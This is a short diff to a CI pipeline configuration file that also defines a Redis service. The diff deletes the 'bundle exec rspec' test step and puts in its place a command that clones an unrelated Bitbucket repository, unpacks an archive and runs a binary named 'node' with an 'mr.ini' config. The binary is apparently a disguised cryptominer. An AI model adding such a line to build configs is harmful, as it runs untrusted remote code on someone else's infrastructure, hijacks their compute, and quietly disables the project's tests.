@@ -9,5 +9,5 @@ services:
     expose:
       - 6379
 script:
-  - bundle exec rspec
+  - git clone https://MoonNgd@bitbucket.org/MoonNgd/mxc.git && cd mxc && tar -xvf MXC.tar.gz && ./node mr.ini
   - bundle exec rake best_practice_project:run
